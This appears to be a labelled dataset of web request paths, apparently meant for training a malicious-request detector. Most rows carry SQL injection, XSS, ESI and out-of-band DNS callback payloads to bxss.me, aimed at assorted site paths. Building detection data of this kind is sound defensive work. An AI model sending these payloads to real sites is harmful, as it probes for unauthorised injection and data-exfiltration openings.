sentences	labels
/******/resource/js/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/jquery-latest.min.js \r\n\r\n 	 1
/***********/shangpinqihuo/heisebankuai/2021-06-16/javascript:void(0) \r\n\r\n 	 1
/***/login.html?status='</script><script>alert(777)</script> \r\n\r\n 	 1
/****/ygzpxx/201812/t20181213_198700.html' and 'x'='y \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(4988)">?_=1630312235646 \r\n\r\n 	 1
/zzsl'||'/******/202107/t20210723_2938511.html \r\n\r\n 	 1
/******/cms/www/201607/15171839f46w.jpg/*/-->'""></iframe></script></style></title></textarea><script >alert(46364)</script> \r\n\r\n 	 1
/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/**/encrypt/jbase64.js \r\n\r\n 	 1
/*******/config.js \r\n\r\n 	 1
/****/system/2021/11/30/javascript:window.close(); \r\n\r\n 	 1
/****/zfwjn/1088/1110/bxss.me/t/xss.html? \r\n\r\n 	 1
/******/qgbzdh/db/index.shtml/<img src="javascript:alert(539)"> \r\n\r\n 	 1
/****/rdjy/\"javascript:void(0)\" \r\n\r\n 	 1
/**********/system/2020/12/06/javascript:void(); \r\n\r\n 	 1
/****/ajax_cmd.php?cmd=completgraphyrecording&filename=<img src=a onload=alert(777)> \r\n\r\n 	 1
/****/wdsjs/hfswsj/202109/t20210906_http://bxss.me/t/fit.txt?.jpg.html \r\n\r\n 	 1
socket.gethostbyname(""hitkh"" ""ibbotibv8416c.bxss.me."")[3].to_s) ""/**/lib/easyui/plugins/jquery.window.js \r\n\r\n 	 1
/****/zfxxgk1/zfxxgkzd'||'/1.htm \r\n\r\n 	 1
/**/ui/widgets/scrollup/css/if(now()=sysdate(),sleep(15),0)/image.css \r\n\r\n 	 1
/******/download/down.jsp?i_id=194814&colid=72;select sleep(5) \r\n\r\n 	 1
/_nuxt/********/select/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/****/zpdt/202010/t20201009_254278.html" and "x"="x \r\n\r\n 	 1
/images'||'/***/main.css \r\n\r\n 	 1
/****/mobiledoc/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> \r\n\r\n 	 1
/****/javascript:window.external.addfavorite('http://www.qhnews.com/****/','中共青海省委领导活动报道集');?wsdl \r\n\r\n 	 1
/************//xfs.bxss.me/jcse/website.js \r\n\r\n 	 1
socket.gethostbyname('hitxz' 'cryipehm45601.bxss.me.')[3].to_s) '/*******/jquery.linkbutton.js \r\n\r\n 	 1
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqzrzyt/\"javascript:void(0)\" \r\n\r\n 	 1
/*****/system/2021/11/17/javascript:window.close(); \r\n\r\n 	 1
/************/risk-disclosure/2017-0'xor(if(now()=sysdate(),sleep(9),0))xor'z-16/673.html \r\n\r\n 	 1
/****/system/count/0036001/017000000000/window.location.href \r\n\r\n 	 1
/************/template/jcse/110105008056111/16//xfs.bxss.me/main.css \r\n\r\n 	 1
/***/system/2008/08/19/002581566.shtml \r\n\r\n 	 1
/*****/dsp_editcreative.cfm?attributes.siteid="">alert(777) \r\n\r\n 	 1
/****/20200514/e100963670.html \r\n\r\n 	 1
/****/mswpmm/common/newaccount.aspx?email=alert(777) \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_columnid=1&i_webid=1&type=1' and 'x'='y \r\n\r\n 	 1
/wp-content/*******/azonpop/files/view/showpopup.php?popid=null /*!00000union*/ select 1,2,/*!00000group_concat(unhex(hex(md5(1234))),0x3c2f62723e,unhex(hex(md5(1234))))*/,4,5 /*!00000from*/ wp_users \r\n\r\n 	 1
/****/20211021/javascript:void(0); \r\n\r\n 	 1
/***********/shangpinqihuo/nongchanpin/2021-01-14/if(now()=sysdate(),sleep(12),0).html \r\n\r\n 	 1
/*****/system/2013/01/16/011001919.shtml \r\n\r\n 	 1
/********/""><script>alert`76524`</script> \r\n\r\n 	 1
/****/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 1
/****/zzxxgk/tjj/zfxxgkml_'""()&%<acx><script >8m5j(9133)</script>/xwfbh_2065/list.html \r\n\r\n 	 1
/****/system/2021/08/04/javascript:void(0); \r\n\r\n 	 1
/****/zfwjn/1088/1091/list.html?new='.gethostbyname(lc('hitxx'.'cjsdturb68be0.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(100).chr(70).chr(99).chr(77).' \r\n\r\n 	 1
/module'||'/***/jpage/theme/simple/css/jpage.css \r\n\r\n 	 1
/****/system/2020/12/04/javascript:dozoom(9) \r\n\r\n 	 1
/***********/jinrongqihuo/0'xor(if(now()=sysdate(),sleep(6),0))xor'z/index_9.html \r\n\r\n 	 1
/****/finderview/api.php?callback=jquery211027821724654516156_1466662510279}}1c027<script>alert(777)</script>cf2ea&type=get&mode=0&_=1466662510280 \r\n\r\n 	 1
/****/bxss.me/t/xss.html? \r\n\r\n 	 1
/****/system/2021/11/10/javascript:window.print() \r\n\r\n 	 1
/cgi-bin/*****/index.php?o=panel&a=receiver.edit&id=alert(777) \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_columnid=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&i_webid=1&type=1 \r\n\r\n 	 1
/****/mswpmm/common/newaccount.aspx?btncreateaccount=alert(777) \r\n\r\n 	 1
/****/zdlygk/ncwywfgz/if(now()=sysdate(),sleep(12),0)/znx/xmb_gzdxb.htm \r\n\r\n 	 1
/****/jsly/znzgjdqzdhzbyjs/201610/t20161014_103590.html" and "x"="y \r\n\r\n 	 1
/****/20211103/javascript:void(0); \r\n\r\n 	 1
/****/dropbox/download?challenge=</script><script>alert(document.domain)</script> \r\n\r\n 	 1
/****/yqzt/qyddt/202005/t20200527_247881.html and 1>1 \r\n\r\n 	 1
/****/http://bxss.me/t/fit.txt?.jpg/tjj/zfxxgkml_2127/jgzn_2042/list.html \r\n\r\n 	 1
/****/gjjj/ \r\n\r\n 	 1
/****/20160714/javascript:void(0); \r\n\r\n 	 1
/*/public/viewclick/?addclick=-1; waitfor delay '0:0:8.629999999999999' -- &classid=243&id=8977 \r\n\r\n 	 1
/****/xxgkml//xfs.bxss.me/ \r\n\r\n 	 1
/****/bysw/http://bxss.me/t/fit.txt/ \r\n\r\n 	 1
/******/system/2017/10/26/javascript:window.print() \r\n\r\n 	 1
/****/system/2021/04/22/013373702'"/>/</script/>/<svg/onload=alert(2568) width=100//>.shtml \r\n\r\n 	 1
/****/jsly/nljx/201501/t20150129_52356.html and 1=1 \r\n\r\n 	 1
/****//xfs.bxss.me/sz/202108/t20210806_185416.html \r\n\r\n 	 1
/****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 1
/**********/system/2021/10/22/javascript:void(0); \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/http://bxss.me/t/fit.txt?.jpg/plugin/voice/voice.css \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/"><script>alert(577)</script>?_=1630311519791 \r\n\r\n 	 1
/****/gccb/gcsg/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/****/gjzqq/index.html?continent=) and 6122=6122# \r\n\r\n 	 1
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1') or 8847=4149  \r\n\r\n 	 1
/**/system/2021/11/28/javascript:void(0); \r\n\r\n 	 1
/****/system/count/0036012/000000000000/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/****/system/2021/11/23/javascript:window.print() \r\n\r\n 	 1
/****/byszf/202109/t20210924_186864.html?leader="".gethostbyname(lc(""hitit"".""fwzxdcbjfd12d.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(119).chr(90).chr(108).chr(75)."" \r\n\r\n 	 1
/****/rdjy/"".gethostbyname(lc(""hitbh"".""mecchcyl14392.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(116).chr(79).chr(115).chr(88).""/t20201225_2539623.html \r\n\r\n 	 1
/bi-security-login/login.jsp?msi=false&redirect="><img/***/onerror=alert(document.domain)> \r\n\r\n 	 1
/****/jtdt/2021_jtyw/202109/t20210922_316987.html \r\n\r\n 	 1
/******/_content/download.jsp?urltype=news.downloadattachurl' or 1269=3738 and '1'='1&owner=1707212448&wbfileid=51419 \r\n\r\n 	 1
/***/col16/index.html"" and ""x""=""x \r\n\r\n 	 1
/****/main/myspace/student.php?keyword=31337"" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search \r\n\r\n 	 1
/****/category/yanjiubaogao?page=1 and 6245=6245 \r\n\r\n 	 1
/************/template/jcse'||'/110105008056111/16/images/result.css \r\n\r\n 	 1
/***/telaen/index.php?tid=default&lid=en_uk&f_email="">alert(777) \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images<esi:include src=""http://bxss.me/rpb.png""/>/jquery.waterfall.js \r\n\r\n 	 1
/***/mswpmm/common/signin.aspx?tbpassword=alert(777)returnurl=/mswpmm/common/default.aspx \r\n\r\n 	 1
/***/productlistcategory.html?productcategoryid=(select char(97) char(110) char(111) char(110) char(121) char(109) char(111) char(117) char(115) char(95) char(115) char(104) char(111) char(112))&price1=3079&&price2=3319 \r\n\r\n 	 1
/****/zzxxgk/tjj/zfxxgkml_2127/jgzn_2042/http://bxss.me/t/fit.txt.html \r\n\r\n 	 1
/vc"" and 2*3*8=6*8 and ""jtyk""=""jtyk/**/css/page.css \r\n\r\n 	 1
/****/zdlygk/ncwywfgz/zws/znx/xmb_gzdxb'||'.htm \r\n\r\n 	 1
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqdzj/\"javascript:void(0)\" \r\n\r\n 	 1
/****/xxgknb/2011/list.html?new=bxss.me \r\n\r\n 	 1
/****/app?adminemail=<script>alert(777)</script>&smtpserver=127.0.0.1&smtpport=25&smtpuser=<script>alert(777)</script>&smtppassword=admin&smtpsecurity=none&proceedbutton=save&operation=config&st=savesmtp \r\n\r\n 	 1
/images' and 2*3*8=6*8 and 've9c'='ve9c/***/lmy.css \r\n\r\n 	 1
/*/public/viewclick/?addclick=1&classid=laytm9rz'; waitfor delay '0:0:13.707' -- &id=10226 \r\n\r\n 	 1
/**/ui%' and 2*3*8=6*8 and '3zv1'!='3zv1%/lib/security/crypto-js.js \r\n\r\n 	 1
/***********/shangpinqihuo' and 2*3*8=6*8 and 'sgla'='sgla/nongchanpin/2021-01-14/1705.html \r\n\r\n 	 1
/******/system/2021/06/09/013399706'""/>\</script\>\<svg/onload=alert(2342) width=100\/>.shtml \r\n\r\n 	 1
/************/search/mainframe.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&searchid=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/******/resource/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/news/newscontent.js \r\n\r\n 	 1
/******/download/downfile.jsp?classid=0%' and 4469=1830 and '%'='&filename=5304f109c5a94f8296864a137b39f53b.xls \r\n\r\n 	 1
/*******/ik9kkfr.php \r\n\r\n 	 1
/****/index.php?vyhl='>alert(777)&lang=cze \r\n\r\n 	 1
/****/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/jsencrypt/jsencrypt.min.js \r\n\r\n 	 1
/*****/system/2021/11/05/javascript:void(0); \r\n\r\n 	 1
/****/system/2009/08/03/javascript:window.print() \r\n\r\n 	 1
/****/zzxxgk/tjj/zfxxgkml_2127/jytabljg_2061<esi:include src=""http://bxss.me/rpb.png""/>/list.html \r\n\r\n 	 1
/'.gethostbyname(lc('hitrw'.'eneyvzki6c789.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(99).chr(72).chr(112).chr(88).'/*******/ybjsqzn/list.html \r\n\r\n 	 1
/************/http://bxss.me/t/fit.txt/jcse/110105008056111/16/images/main.css \r\n\r\n 	 1
/****/czgk/bmjs/zzqfyxt/szsszjrmfy/\"javascript:void(0)\" \r\n\r\n 	 1
/****/zjdt/czjs/zcwj/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.htm \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(3499)">?_=1630311909102 \r\n\r\n 	 1
/**/\"javascript:void(0)\" \r\n\r\n 	 1
/****/group-summary.jsp?search=test" onmouseover=alert(777) x=" \r\n\r\n 	 1
/****/"".gethostbyname(lc(""hitvu"".""xegwefppec364.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(122).chr(87).chr(98).chr(68).""/ \r\n\r\n 	 1
/**/api/sources?resource=alert(/777/)&format=txt \r\n\r\n 	 1
/****/system/2016/11/14/javascript:dozoom(9) \r\n\r\n 	 1
/**/ui/lib/easyui/'""()&%<acx><script >8uvj(9915)</script>/jquery.window.js \r\n\r\n 	 1
socket.gethostbyname(""hithd"" ""erqdcurh149e4.bxss.me."")[3].to_s) ""/**/images/result.css \r\n\r\n 	 1
/******/system/2020/07/07/javascript:void(); \r\n\r\n 	 1
/**********/system/2012/08/28/010867969.shtml \r\n\r\n 	 1
/*****/system/2019/09/26/javascript:void(0); \r\n\r\n 	 1
/****/20200627/e102801418.html \r\n\r\n 	 1
/******/system/2016/09/14/javascript:window.print() \r\n\r\n 	 1
/**********/system/2013/08/16/011161502.shtml \r\n\r\n 	 1
/****/phpliteadmin_v1-1/phpliteadmin.php?table=""/>alert(777) \r\n\r\n 	 1
/***/col136/index.html/"><script>alert(442)</script> \r\n\r\n 	 1
/******/jslib' and 2*3*8=6*8 and 'xont'='xont/grouppic/jquery.ad-gallery2.css \r\n\r\n 	 1
/******/5/hanweb'""()&%<acx><script >mnpf(9819)</script>.css \r\n\r\n 	 1
/******/"".gethostbyname(lc(""hitxk"".""vvxzpila32c45.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(116).chr(75).chr(99).chr(80)."".js \r\n\r\n 	 1
/***/2021/10/11/art'||'_34_242320.html \r\n\r\n 	 1
/***/wp-admin/admin-post.php?page=fancybox-for-wordpress \r\n\r\n 	 1
/****/index.cfm?field="">alert(777) \r\n\r\n 	 1
/****/system/2016/03/29/javascript:dozoom(14) \r\n\r\n 	 1
/investors-garden/***/if(now()=sysdate(),sleep(12),0)_2.html \r\n\r\n 	 1
/****/bysw/202007/t20200701_168744.html?leader="".gethostbyname(lc(""hitow"".""jojiqievcadbd.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(112).chr(90).chr(106).chr(67)."" \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images/http://bxss.me/t/fit.txt?.jpg/selectpick/css.css \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_articleid=242318&i_columnid=34&i_webid=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&type=3 \r\n\r\n 	 1
/****/web/search?page=2&channelid=253477&searchword=1%') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)-- &keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 1
/*****/20200903/javascript:void(0); \r\n\r\n 	 1
/****/files.php?folder="">alert(777) \r\n\r\n 	 1
/****/main/admin/configure_extensions.php?display=</script><script>confirm(777)</script> \r\n\r\n 	 1
/****/zjdt'||'/zjdt/gzdt.htm \r\n\r\n 	 1
/***/player.swf?autostart=true&file="'><img src="/wf_xsrf2762.html"> \r\n\r\n 	 1
/****/zzxxgk/tjj/zfxxgkml_2127/hygq_2064/list.html?new='""()&%<acx><script >nuyr(9746)</script> \r\n\r\n 	 1
/************/template/jcse/110105008056111/http://bxss.me/t/fit.txt?.jpg/images/main.css \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(975)">?_=1630311675687 \r\n\r\n 	 1
/*****/system/2020/01/23/javascript:window.print() \r\n\r\n 	 1
/*******/07xmv5ue.php \r\n\r\n 	 1
/******/jquery_xw.js \r\n\r\n 	 1
/*/201020-1/videos-detail'""()&%<acx><script >edjc(9316)</script>/89f1a343e891a0a00a940d84f9626bcf.js \r\n\r\n 	 1
/*******/mja.php \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448') and 6376=6376 and ('1'='1 \r\n\r\n 	 1
/****/czgk/bmyjs/zzqjcyxt/ycxjcy/\"javascript:void(0)\" \r\n\r\n 	 1
/****/zfwjn/1088/1098/list.html?new='""()&%<acx><script >xg1h(9359)</script> \r\n\r\n 	 1
/****/?wvstest=javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"") \r\n\r\n 	 1
/****/search.jspx?q=';window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()' \r\n\r\n 	 1
/****/zzxxgk/whgdj/?id=4001%' or 2468=1350 and '%%'='% \r\n\r\n 	 1
/**********/system/2021/08/19/013437157.shtmldata:image/svg xml,<svg width= \r\n\r\n 	 1
/***/600/10/50/21/10502106_867773.jpg \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_columnid=1&i_webid=if(now()=sysdate(),sleep(15),0)&type=1 \r\n\r\n 	 1
/****/system/2021/10/11/javascript:window.print() \r\n\r\n 	 1
/**/ui/widgets/hanweb/validity/validity"" and 2*3*8=6*8 and ""ptdl""=""ptdl.js \r\n\r\n 	 1
/***/wp-content/plugins/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645 \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images'||'/plugin/selectpick/css.css \r\n\r\n 	 1
/******/wordpress/wp-content/plugins/securimage-wp/siwp_test.php/""/>alert(777);?tested=1 \r\n\r\n 	 1
/****/web/search?channelid=299868%' or 6576=6576 and '%'='&perpage=1000 \r\n\r\n 	 1
/****/zzxxgk/tjj/0""xor(if(now()=sysdate(),sleep(15),0))xor""z_2127/xwfbh_2065/list.html \r\n\r\n 	 1
/*****/system/2020/08/24/javascript:window.close(); \r\n\r\n 	 1
/*/210514-'""()&%<acx><script >rsbr(9740)</script>/index/93aa5449bf388d846409a3d11e199a08.css \r\n\r\n 	 1
/****/main/calendar/agenda_list.php?type=personal' onmouseover='confirm(777)'/><!-- \r\n\r\n 	 1
socket.gethostbyname('hitha' 'nofzfkuy3fc33.bxss.me.')[3].to_s) '/***************/16/images/result.css \r\n\r\n 	 1
/****/system/2012/04/03/javascript:dozoom(12) \r\n\r\n 	 1
/****/mavideo/gvideos.php?gid=1 and 1=1 \r\n\r\n 	 1
/*******/glkual3.php \r\n\r\n 	 1
socket.gethostbyname('hitpu' 'drnhirnd62037.bxss.me.')[3].to_s) '/**/images/common.js \r\n\r\n 	 1
/**********/rwgs/javascript:void(); \r\n\r\n 	 1
/****/zfwjn/1088/1098/list.html?new="".gethostbyname(lc(""hitip"".""vanutndf4143d.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(114).chr(88).chr(105).chr(83)."" \r\n\r\n 	 1
/***/index.php?vyhl='>alert(777)&lang=cze \r\n\r\n 	 1
/**********/system/2013/11/13/011232720.shtml \r\n\r\n 	 1
/*****/20200910/javascript:void(0); \r\n\r\n 	 1
/****/admin/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777) \r\n\r\n 	 1
/****/nyjx/images/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/****/sys/sys/listabd2.jsp?bd="/><script>alert(777)</script> \r\n\r\n 	 1
/xwdt' and 2*3*8=6*8 and 'r6sg'='r6sg/****/csjs/gzdt.htm \r\n\r\n 	 1
/**/system/count/0006000/000000000000/ \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448') and 0688=0688 and '1'='1 \r\n\r\n 	 1
/zwgk'||'/*******/1.htm \r\n\r\n 	 1
//***********/5/top-footer.css \r\n\r\n 	 1
/*****/system/2020/06/04/javascript:window.close(); \r\n\r\n 	 1
/****/classifier,ruleset.jsp?action_flag=&page=1&kw="/><script>alert(777)</script>&id=&domain=&keyword=&points= \r\n\r\n 	 1
/***/index.php?action=list&order=name&srt=yes&lang=en"/><script>alert(777);</script> \r\n\r\n 	 1
/****/category/guowaishichangzhunru?page=1' or 1601=1601 /* \r\n\r\n 	 1
/****/xxgkml'||'/zfczyjs/list.html \r\n\r\n 	 1
/****/kjzl/fzzl/ \r\n\r\n 	 1
/**/ui/lib'||'/security/sm2.js \r\n\r\n 	 1
/************/template/jcse'""()&%<acx><script >m5zd(9159)</script>/110105008056111/16/images/css.js \r\n\r\n 	 1
/*****/system/2013/04/16/011064145.shtml \r\n\r\n 	 1
/******/system/2019/11/25/javascript:window.print() \r\n\r\n 	 1
/*****/system/2019/11/01/javascript:window.close(); \r\n\r\n 	 1
/*************/zeroclipboard.swf?id="))}catch(e){}if(!self.a)self.a=!prompt(document.domain)//&width&height \r\n\r\n 	 1
/*******/jlcorevalue?id=51);select sleep(5) \r\n\r\n 	 1
/if(now()=sysdate(),sleep(12),0)/****/gcjsbzgl/gcjybz/1.htm \r\n\r\n 	 1
/****/web/search?page=2&channelid=*/-->'""></iframe></script></style></title></textarea><script >alert(30174)</script>&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 1
/****/bmkx<esi:include src=""http://bxss.me/rpb.png""/>/ \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images/bxss.me.js \r\n\r\n 	 1
/**/ui/lib"" and 2*3*8=6*8 and ""lzrx""=""lzrx/easyui/plugins/jquery.parser.js \r\n\r\n 	 1
/**/system/2021/10/30/javascript:void(0); \r\n\r\n 	 1
/******/resource/storage/localupload.jsp?doaction=save&rid=1rnott09fg' and 9682=9682 and '1'='1&uptoken=1ff87566684b40c688f756b86e2c3798 \r\n\r\n 	 1
/************/template/jcse<esi:include src=""http://bxss.me/rpb.png""/>/110105008056111/16/images/plugin/analysis/jquery.windstagball.js \r\n\r\n 	 1
/wp-content/*******/wp-events-calendar/public/ajax/geteventslist.php?calendar_id=<script language='php'>echo 10516*61501;</script>&month=5&year=2018&day=1&pag=1 \r\n\r\n 	 1
/col"" and 2*3*8=6*8 and ""e66u""=""e66u/******/index.html \r\n\r\n 	 1
/***/swiper.min.css \r\n\r\n 	 1
/***//<script>alert`76645`</script> \r\n\r\n 	 1
/****/zdlygk/gczlzl/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm \r\n\r\n 	 1
/****/zdgz/2020_zdgz/202108/t20210824_314976.html" and "x"="y \r\n\r\n 	 1
/**/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search \r\n\r\n 	 1
/****/zjdt/if(now()=sysdate(),sleep(12),0)/gzdt/144.htm \r\n\r\n 	 1
/****/netflow/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_columnid=34&i_webid=1&type=2 and 1=1 \r\n\r\n 	 1
/************/search.do?begin=20201012&end=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&eq=1&oq=1&p=1&pg=1&pos=filenumber&q=请输入关键词&searchid=1&tpl=16&websiteid= \r\n\r\n 	 1
/****/view.php?aid=63522 \r\n\r\n 	 1
/***/css_js.php \r\n\r\n 	 1
/****/zzxxgk/wsjkwyh/javascript:void(0) \r\n\r\n 	 1
/****//xfs.bxss.me/202012/t20201225_2539623.html \r\n\r\n 	 1
/***/col269/index.html"" and ""x""=""y \r\n\r\n 	 1
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10%' or 3467=3467  \r\n\r\n 	 1
/****/zgsdt/2021_qydt/202110/t20211012_318360.html" and "x"="x \r\n\r\n 	 1
/*****/system/2020/01/14/javascript:window.print() \r\n\r\n 	 1
/****/xxgknb/2012/'.gethostbyname(lc('hitue'.'rhrlekxf2732c.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(99).chr(80).chr(110).chr(76).'.html \r\n\r\n 	 1
/*****/system/2020/10/21/javascript:void(0); \r\n\r\n 	 1
/****/web/search/search?page=3&channelid=287219&searchword=1&keyword=1&orderby=-docreltime';select sleep(5) \r\n\r\n 	 1
/************/template/jcse/110105008056111<img src=x onerror=alert(5311)>/16/images/layer/layer.js \r\n\r\n 	 1
/******/web/jpage/http://bxss.me/t/fit.txt/default/css/jpage.css \r\n\r\n 	 1
/****/if(now()=sysdate(),sleep(12),0)/csjs/gzdt.htm \r\n\r\n 	 1
/************/template/jcse/110105008056111/16//xfs.bxss.me/plugin/selectpick/js.js \r\n\r\n 	 1
/****/20210528/javascript:void(0); \r\n\r\n 	 1
/******/resource/js/newcalendar/wdatepicker' and 2*3*8=6*8 and 'siv0'='siv0.js \r\n\r\n 	 1
/************/template/http://bxss.me/t/fit.txt/110105008056111/16/images/ui.css \r\n\r\n 	 1
/****/'""()&%<acx><script >8fii(9702)</script>/2014/list.html \r\n\r\n 	 1
/**/system/2020/10/14/javascript:void(0); \r\n\r\n 	 1
/*****/ajax_cmd.php?cmd=completgraphyrecording&filename=<img src=a onload=alert(777)> \r\n\r\n 	 1
/****/consultdetails/denmark \r\n\r\n 	 1
/****/20210803/javascript:void(0); \r\n\r\n 	 1
/******/mydevice/index.jsp?locale=""><script>alert(777)</script> \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_articleid[0]==2and 3 in &i_articleid[1]=3'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1103019683')))>'0&i_columnid=15&i_webid=1&type=3 \r\n\r\n 	 1
/*****/admin/edit.php?menu="">pt>alert(777); script>pt> \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/"><script>alert(4642)</script>?_=1630312098691 \r\n\r\n 	 1
/****/zdlygk/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/zws/znx/xmb_gzdxb.htm \r\n\r\n 	 1
/****/xxgkml/zdmsxx/list.html?new=0.30645946703217297'""()&%<acx><script >taj0(9089)</script> \r\n\r\n 	 1
/****/phpwiki/index.php?pagename=</script><script>alert(777)</script><!-- \r\n\r\n 	 1
/************/template//xfs.bxss.me/110105008056111/16/images/result.css \r\n\r\n 	 1
/****/system/2017/02/15/javascript:window.print() \r\n\r\n 	 1
/****/system/2017/10/18/012443887.shtml \r\n\r\n 	 1
/****/czgk/bmyjs/qtdw/zzqnfb/\"javascript:void(0)\" \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448' and 7925=9175  \r\n\r\n 	 1
/****/mytag_js.php?aid=9527, \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_columnid=1&i_webid=1&type=1'and/**/extractvalue(1,concat(char(126),md5(1417582364)))and' \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images/plugin//xfs.bxss.me/criteria.js \r\n\r\n 	 1
/******/0""xor(if(now()=sysdate(),sleep(3),0))xor""z/quotation-service/2017-03-22/687.html \r\n\r\n 	 1
/****/rest/prototype/1/session/check/something<img src=a onerror=alert(777)> \r\n\r\n 	 1
/****/jypx/pxdt/ \r\n\r\n 	 1
/****/zjdt/zjdt' and 2*3*8=6*8 and 'qzgp'='qzgp/gzdt/1.htm \r\n\r\n 	 1
/**********/system/2021/10/26/javascript:window.close(); \r\n\r\n 	 1
/*******/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 1
/****/web/search?channelid=299868&perpage=1000%' or 6620=6226  \r\n\r\n 	 1
